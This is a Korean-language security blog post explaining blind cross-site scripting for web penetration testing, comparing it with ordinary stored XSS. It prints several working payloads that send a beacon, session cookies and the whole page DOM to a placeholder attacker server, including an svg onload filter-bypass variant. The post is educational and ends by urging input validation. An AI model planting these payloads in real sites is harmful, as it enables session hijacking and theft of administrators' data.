---
layout: post
title:  "[웹 모의해킹] Blind XSS 란?"
date:   2025-07-16 21:03:00 +0900
categories: [Security]
tags: [xss, blind xss, 블라인드 xss]
---


# [웹 모의해킹] Blind XSS 란?

## 1. 블라인드 XSS(Blind XSS)란?

  - 블라인드 XSS는 공격자가 삽입한 악성 스크립트(페이로드)가 **"즉시 실행 결과를 반환하지 않고"**, 예측할 수 없는 시점과 장소에서 실행되는 **Stored XSS(저장형 XSS)**의 한 유형 입니다.
  - 일반적인 Stored XSS는 **공격자가 게시판에 악성 스크립트를 포함한 글을 작성**하면, **다른 사용자가 그 글을 읽는 즉시 공격이 실행되는 것을 확인**할 수 있습니다. 
  - 하지만 블라인드 XSS는 공격자가 입력한 페이로드가 데이터베이스 등에 저장되었다가, 공격자의 접근 권한이 없는 다른 페이지
  (예: 관리자 페이지, 내부 로그 분석 시스템 등)에서 해당 데이터를 조회할 때 비로소 실행됩니다.
  
---

### **주요 특징**

- **저장형 XSS의 하위 개념**
    - 악성 스크립트가 서버(데이터베이스, 로그 파일 등)에 저장된다는 점에서 저장형 XSS와 동일합니다.
- **예측 불가능한 실행 위치**
    - 스크립트가 일반 사용자 페이지가 아닌, **관리자 페이지, 내부 모니터링 시스템, 로그 분석기** 등 예상치 못한 곳에서 실행됩니다.
- **긴 잠복기**
    - 공격 스크립트가 삽입된 후 실행되기까지 몇 시간, 며칠, 심지어 몇 달이 걸릴 수도 있습니다.

---


## 2. 일반적인 저장형 XSS와의 차이점

알고 계신 일반적인 저장형 XSS와 블라인드 XSS의 가장 큰 차이점은 **'결과 확인의 즉시성'** 입니다.

| 구분 | 일반 저장형 XSS | 블라인드 XSS |
| :--- | :--- | :--- |
| **실행 위치** | 예측 가능 (게시판 등) | 예측 불가능 (관리자 페이지 등) |
| **결과 확인** | 직접 확인 가능 | 외부 콜백(Callback)으로 확인 |
| **주요 대상** | 일반 사용자 | 관리자 등 고권한자 |

---

## 3. 대표적인 페이로드(Payloads)

- 블라인드 XSS는 공격 결과를 직접 볼 수 없으므로, 페이로드의 핵심은 **"스크립트가 실행되었다는 사실"**과 **"탈취한 정보"**를 **"외부에서 확인"**할 수 있도록 하는 것 입니다.
- 이를 위해 보통 공격자가 제어할 수 있는 외부 서버로 정보를 전송하는 **"콜백(Callback) 형태의 페이로드"**를 사용 합니다.

### 1. 간단한 실행 확인 페이로드
- 가장 기본적인 페이로드는 스크립트가 실행되었음을 공격자의 서버로 알리는 것입니다. script 태그를 이용하는 것이 일반적입니다.

~~~javascript
<script>
  new Image().src="http://[ATTACKER_SERVER]/log?trigger=success";
</script> 
~~~

#### 1-1) 작동 원리
- new Image().src는 이미지 객체를 생성하고 src 속성에 명시된 URL로 HTTP 요청을 보냅니다. 
- 브라우저는 이 요청을 보내면서 공격자 서버의 로그에 기록을 남기게 됩니다. 이를 통해 공격자는 스크립트가 실행되었음을 알 수 있습니다.

---

### 2. 쿠키 정보 탈취 페이로드
- 관리자나 다른 사용자의 세션을 탈취하기 위해 쿠키 정보를 외부로 빼돌리는 페이로드입니다
~~~javascript
<script>
  new Image().src="http://[ATTACKER_SERVER]/log?cookie=" + btoa(document.cookie);
</script>
~~~

#### 2-1) 작동 원리
- document.cookie로 현재 페이지의 쿠키 정보를 가져옵니다. b
- toa() 함수를 사용해 쿠키 값을 Base64로 인코딩하여 URL 파라미터로 전송 시 발생할 수 있는 특수문자 문제를 방지합니다.
- 공격자는 자신의 서버 로그에서 인코딩된 쿠키 값을 확인할 수 있습니다.

---

### 3. 페이지의 DOM 정보 탈취 페이로드
- 스크립트가 실행된 페이지의 전체 HTML 구조(DOM)를 훔쳐내어, 내부 시스템의 구조나 숨겨진 정보를 파악하는 데 사용됩니다.
~~~javascript
<script>
  fetch('http://[ATTACKER_SERVER]/log', {
    method: 'POST',
    body: btoa(document.documentElement.outerHTML),
    headers: {'Content-Type': 'text/plain'}
  });
</script>
~~~

#### 3-1) 작동 원리
- document.documentElement.outerHTML로 현재 페이지의 html 태그를 포함한 전체 HTML을 가져옵니다.
- fetch API를 사용하여 POST 방식으로 공격자의 서버에 전송합니다.
- **대량의 데이터를 보내야** 하므로 GET 방식의 Image 트릭보다 **POST 방식이 더 적합**합니다.

---

### 4. 이벤트 핸들러를 이용한 우회 페이로드
- script 태그가 필터링될 경우, 다른 HTML 태그의 이벤트 핸들러를 이용해 스크립트를 실행할 수 있습니다.

~~~javascript
<svg onload="new Image().src='http://[ATTACKER_SERVER]/log?data='+btoa(document.cookie)">
~~~

#### 4-1) 작동 원리
- svg 태그가 로드될 때 onload 이벤트가 발생하며, 여기에 포함된 자바스크립트 코드가 실행됩니다. 
- 이 외에도 img onerror="..." / input onfocus="..." 등 다양한 이벤트 핸들러를 활용할 수 있습니다.


---

<br>

이처럼 블라인드 XSS는 즉각적인 피드백이 없어 탐지가 어렵지만, 일단 성공하면 관리자 권한 탈취, 내부망 정보 유출 등 심각한 피해로 이어질 수 있는 강력한 공격 기법입니다. 

따라서 개발 단계부터 사용자 입력값에 대한 철저한 검증과 시큐어 코딩 원칙을 준수하는 것이 매우 중요합니다.

<br>

---